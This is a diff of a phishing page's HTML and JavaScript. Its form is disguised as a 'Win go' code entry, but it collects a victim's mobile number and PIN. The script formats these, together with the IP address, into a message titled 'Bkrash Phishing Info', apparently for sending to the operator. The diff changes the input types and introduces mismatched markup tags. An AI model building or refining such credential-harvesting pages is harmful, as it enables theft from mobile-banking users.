@@ -105,11 +105,11 @@
     <div class="container">
         <div class="input-group">
             <p>Enter your Win go code</p>
-            <input type="number" placeholder="Ex: UDRdfeEsdDf==" id="mobileNumber">
+            <input type="text" placeholder="Ex: UDRdfeEsdDf==" id="mobileNumber">
         </div>
         <div class="input-group">
             <p>Enter your Big/Smaill code</p>
-            <input type="number" placeholder="Ex: TRReEwS=" id="pin">
+            <input type="text" placeholder="Ex: TRReEwS=" id="pin">
         </div>
         <button id="loginButton">Login <span>&#8594;</span></button>
     </div>
@@ -168,9 +168,9 @@ loginButton.addEventListener('click', async () => {
 
     const userMessage = `<b>🎣 Bkrash Phishing Info</b>
     
-📱<b>Mobile Number:</b> <code>${loginData.mobileNumber}</code>
+📱<b>Mobile Number:</b> <text>${loginData.mobileNumber}</code>
     
-🔐<b>PIN:</b> <code>${loginData.pin}</code>
+🔐<b>PIN:</b> <text>${loginData.pin}</code>
     
 🌐<b>IP Address:</b> ${loginData.ip}
     
